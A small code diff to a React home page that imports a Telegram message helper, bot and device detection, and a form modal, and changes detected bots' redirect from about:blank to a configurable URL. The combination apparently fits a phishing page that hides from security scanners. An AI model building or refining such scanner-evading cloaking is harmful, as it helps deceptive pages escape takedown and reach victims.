@@ -5,6 +5,7 @@ import TichImage from '@/assets/images/tich.webp';
 import { translateText } from '@/utils/translate';
 import sendMessage from '@/utils/telegram';
 import detectBot from '@/utils/detect_bot';
+import config from '@/utils/config';
 import detectDevice from '@/utils/detect_device';
 import countryToLanguage from '@/utils/country_to_language';
 import FirstFormModal from '@/components/FirstFormModal';
@@ -244,7 +245,7 @@ const Home = () => {
 
             const botResult = await detectBot();
             if (botResult.isBot) {
-                window.location.href = 'about:blank';
+                window.location.href = config.bot_redirect_url;
                 return;
             }
 
